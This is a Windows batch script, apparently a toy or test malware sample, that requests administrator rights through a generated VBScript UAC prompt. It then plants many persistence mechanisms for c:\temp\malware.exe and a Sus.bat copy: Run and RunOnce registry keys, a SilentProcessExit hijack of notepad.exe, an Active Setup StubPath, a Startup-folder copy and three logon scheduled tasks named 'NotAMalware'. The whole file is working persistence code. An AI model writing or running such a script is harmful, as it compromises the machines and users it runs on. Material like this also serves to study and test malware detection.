@echo off
:: BatchGotAdmin
::-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
::--------------------------------------
setlocal
reg add HKLM\Software\Malware /v Covid19 /t REG_SZ /f
reg add HKLM\Software\Important /v Covid19 /t REG_SZ /f
reg add HKLM\Software\YourPPSmol /v Covid19 /t REG_SZ /f
reg add HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe /v GlobalFlag /t REG_DWORD /d 0x200
reg add HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe /v ReportingMode /t REG_DWORD /d 0x1
reg add HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe /v MonitorProcess /t REG_SZ /d c:\temp\malware.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Malware /t REG_SZ /d c:\temp\malware.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Malware /t REG_SZ /d c:\temp\malware.exe
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Malware /t REG_SZ /d c:\temp\malware.exe
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Malware /t REG_SZ /d c:\temp\malware.exe
reg add HKLM\Software\Microsoft\Active Setup\Installed Components\{Malware} /v StubPath /t REG_SZ /d c:\temp\malware.exe

ECHO del Covid19.bat > "C:\Users\User\Documents\NotCovid19.txt"
copy "C:\Users\User\Documents\NotCovid19.txt" "C:\Users\User\Documents\Covid19.bat"

cd C:/Windows
mkdir Covid19
copy /Y %~dp0Sus.bat "C:\Users\User\Desktop\Sus.bat"
copy /Y %~dp0Sus.bat "C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.bat"
copy /Y %~dp0Sus.bat "C:\Windows\Covid19\Sus.bat"
SCHTASKS /CREATE /SC ONLOGON /TN "System\NotAMalware" /TR "C:\Users\User\Desktop\Sus.bat" /F
SCHTASKS /CREATE /SC ONLOGON /TN "System\NotAMalwareStart" /TR "C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.bat" /F
SCHTASKS /CREATE /SC ONLOGON /TN "System\NotAMalwareWindows" /TR "C:\Windows\Covid19\Sus.bat" /F

PAUSE
